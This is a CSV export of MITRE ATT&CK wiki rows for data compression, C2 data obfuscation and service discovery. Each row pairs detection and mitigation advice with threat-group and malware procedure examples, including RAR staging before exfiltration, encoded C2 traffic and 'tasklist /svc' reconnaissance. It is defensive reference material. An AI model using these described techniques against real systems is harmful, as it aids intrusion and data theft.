76,"['Compression software and compressed files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known compression utilities. This may yield a significant amount of benign events, depending on how systems in the environment are typically used.\n\nIf the communications channel is unencrypted, compressed files can be detected in transit during exfiltration with a network intrusion detection or data loss prevention system analyzing file headers.[[CiteRef::Wikipedia File Header Signatures]]']",[],[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']","['[[Group/G0027|Threat Group-3390]] has used RAR to compress, encrypt, and password-protect files prior to exfiltration.[[CiteRef::SecureWorks BRONZE UNION June 2017]]']",['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to compress files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIf network intrusion prevention or data loss prevention tools are set to block specific file types from leaving the network over unencrypted channels, then an adversary may move to an encrypted channel.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Exfiltration'],['Technique/T1002'],['Data Compressed'],https://attack.mitre.org/wiki/Technique/T1002
77,"['Compression software and compressed files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known compression utilities. This may yield a significant amount of benign events, depending on how systems in the environment are typically used.\n\nIf the communications channel is unencrypted, compressed files can be detected in transit during exfiltration with a network intrusion detection or data loss prevention system analyzing file headers.[[CiteRef::Wikipedia File Header Signatures]]']",[],[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0027|Threat Group-3390]] actors have compressed data into RAR files prior to exfiltration.[[CiteRef::Dell TG-3390]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to compress files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIf network intrusion prevention or data loss prevention tools are set to block specific file types from leaving the network over unencrypted channels, then an adversary may move to an encrypted channel.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Exfiltration'],['Technique/T1002'],['Data Compressed'],https://attack.mitre.org/wiki/Technique/T1002
78,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Process use of network', 'Process monitoring', 'Network protocol analysis']","['After encrypting C2 data, [[Software/S0128|BADNEWS]] converts it into a hexadecimal representation and then encodes it into base64.[[CiteRef::Forcepoint Monsoon]]']",['MONSOON'],"['MONSOON', 'Operation Hangover']",['G0042'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: BADNEWS,['Command and Control'],['Technique/T1001'],['Data Obfuscation'],https://attack.mitre.org/wiki/Technique/T1001
79,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Process use of network', 'Process monitoring', 'Network protocol analysis']","['The [[Group/G0001|Axiom]] group has used other forms of obfuscation, include commingling legitimate traffic with communications traffic so that network streams appear legitimate.[[CiteRef::Axiom]]']",['Axiom'],"['Axiom', 'Group 72']",['G0001'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],['Technique/T1001'],['Data Obfuscation'],https://attack.mitre.org/wiki/Technique/T1001
80,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Process use of network', 'Process monitoring', 'Network protocol analysis']",['Some malware that has been used by [[Group/G0001|Axiom]] uses steganography to hide communication in PNG image files.[[CiteRef::Axiom]]'],['Axiom'],"['Axiom', 'Group 72']",['G0001'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],['Technique/T1001'],['Data Obfuscation'],https://attack.mitre.org/wiki/Technique/T1001
81,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Process use of network', 'Process monitoring', 'Network protocol analysis']",['The [[Software/S0015|Ixeshe]] malware uses custom Base64 encoding schemes to obfuscate data command and control traffic in the message body of HTTP requests.[[CiteRef::Moran 2013]]'],['APT12'],"['APT12', 'IXESHE', 'DynCalc', 'Numbered Panda']",['G0005'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Ixeshe,['Command and Control'],['Technique/T1001'],['Data Obfuscation'],https://attack.mitre.org/wiki/Technique/T1001
82,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Process use of network', 'Process monitoring', 'Network protocol analysis']","['[[Group/G0007|APT28]] added ""junk data"" to each encoded string, preventing trivial decoding without knowledge of the junk removal algorithm. Each implant was given a ""junk length"" value when created, tracked by the controller software to allow seamless communication but prevent analysis of the command protocol on the wire.[[CiteRef::FireEye APT28]]']",['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],['Technique/T1001'],['Data Obfuscation'],https://attack.mitre.org/wiki/Technique/T1001
83,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Process use of network', 'Process monitoring', 'Network protocol analysis']","['[[Software/S0076|FakeM]] C2 traffic attempts to evade detection by resembling data generated by legitimate messenger applications, such as MSN and Yahoo! messengers.[[CiteRef::Scarlet Mimic Jan 2016]]']",['Scarlet Mimic'],['Scarlet Mimic'],['G0029'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: FakeM,['Command and Control'],['Technique/T1001'],['Data Obfuscation'],https://attack.mitre.org/wiki/Technique/T1001
84,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Process use of network', 'Process monitoring', 'Network protocol analysis']",['Newer variants of [[Software/S0031|BACKSPACE]] will encode C2 communications with a custom system.[[CiteRef::FireEye APT30]]'],['APT30'],['APT30'],['G0013'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: BACKSPACE, Lecna",['Command and Control'],['Technique/T1001'],['Data Obfuscation'],https://attack.mitre.org/wiki/Technique/T1001
85,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Process use of network', 'Process monitoring', 'Network protocol analysis']","['Some [[Software/S0093|Backdoor.Oldrea]] samples use standard Base64 + bzip2, and some use standard Base64 + reverse XOR + RSA-2048 to decrypt data received from C2 servers.[[CiteRef::Symantec Dragonfly]]']",['Dragonfly'],"['Dragonfly', 'Energetic Bear']",['G0035'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: Backdoor.Oldrea, Havex",['Command and Control'],['Technique/T1001'],['Data Obfuscation'],https://attack.mitre.org/wiki/Technique/T1001
86,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Process use of network', 'Process monitoring', 'Network protocol analysis']",['[[Software/S0037|HAMMERTOSS]] is controlled via commands that are appended to image files.[[CiteRef::FireEye APT29]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: HAMMERTOSS, HammerDuke, NetDuke",['Command and Control'],['Technique/T1001'],['Data Obfuscation'],https://attack.mitre.org/wiki/Technique/T1001
87,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['574'],[],"['Process command-line parameters', 'Process monitoring']",['The <code>net start</code> command can be used in [[Software/S0039|Net]] to find information about Windows services.[[CiteRef::Savill 1999]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: Net, net.exe",['Discovery'],['Technique/T1007'],['System Service Discovery'],https://attack.mitre.org/wiki/Technique/T1007
88,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['574'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0057|Tasklist]] can be used to discover services running on a system.[[CiteRef::Microsoft Tasklist]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],Software: Tasklist,['Discovery'],['Technique/T1007'],['System Service Discovery'],https://attack.mitre.org/wiki/Technique/T1007
89,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['574'],[],"['Process command-line parameters', 'Process monitoring']",['The <code>net start</code> command can be used in [[Software/S0039|Net]] to find information about Windows services.[[CiteRef::Savill 1999]]'],['Ke3chang'],['Ke3chang'],['G0004'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: Net, net.exe",['Discovery'],['Technique/T1007'],['System Service Discovery'],https://attack.mitre.org/wiki/Technique/T1007
90,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['574'],[],"['Process command-line parameters', 'Process monitoring']",['[[Group/G0004|Ke3chang]] performs service discovery using <code>net start</code> commands.[[CiteRef::Villeneuve et al 2014]]'],['Ke3chang'],['Ke3chang'],['G0004'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],[],['Discovery'],['Technique/T1007'],['System Service Discovery'],https://attack.mitre.org/wiki/Technique/T1007
91,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['574'],[],"['Process command-line parameters', 'Process monitoring']",['The <code>net start</code> command can be used in [[Software/S0039|Net]] to find information about Windows services.[[CiteRef::Savill 1999]]'],['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: Net, net.exe",['Discovery'],['Technique/T1007'],['System Service Discovery'],https://attack.mitre.org/wiki/Technique/T1007
92,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['574'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0057|Tasklist]] can be used to discover services running on a system.[[CiteRef::Microsoft Tasklist]]'],['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],Software: Tasklist,['Discovery'],['Technique/T1007'],['System Service Discovery'],https://attack.mitre.org/wiki/Technique/T1007
93,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['574'],[],"['Process command-line parameters', 'Process monitoring']",['The <code>net start</code> command can be used in [[Software/S0039|Net]] to find information about Windows services.[[CiteRef::Savill 1999]]'],['Turla'],"['Turla', 'Waterbug']",['G0010'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: Net, net.exe",['Discovery'],['Technique/T1007'],['System Service Discovery'],https://attack.mitre.org/wiki/Technique/T1007
94,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['574'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0057|Tasklist]] can be used to discover services running on a system.[[CiteRef::Microsoft Tasklist]]'],['Turla'],"['Turla', 'Waterbug']",['G0010'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],Software: Tasklist,['Discovery'],['Technique/T1007'],['System Service Discovery'],https://attack.mitre.org/wiki/Technique/T1007
95,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['574'],[],"['Process command-line parameters', 'Process monitoring']",['[[Group/G0010|Turla]] surveys a system upon check-in to discover running services and associated processes using the <code>tasklist /svc</code> command.[[CiteRef::Kaspersky Turla]]'],['Turla'],"['Turla', 'Waterbug']",['G0010'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],[],['Discovery'],['Technique/T1007'],['System Service Discovery'],https://attack.mitre.org/wiki/Technique/T1007
96,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['574'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0081|Elise]] executes <code>net start</code> after initial communication is made to the remote server.[[CiteRef::Lotus Blossom Jun 2015]]'],['Lotus Blossom'],"['Lotus Blossom', 'Spring Dragon']",['G0030'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: Elise, BKDR_ESILE, Page",['Discovery'],['Technique/T1007'],['System Service Discovery'],https://attack.mitre.org/wiki/Technique/T1007
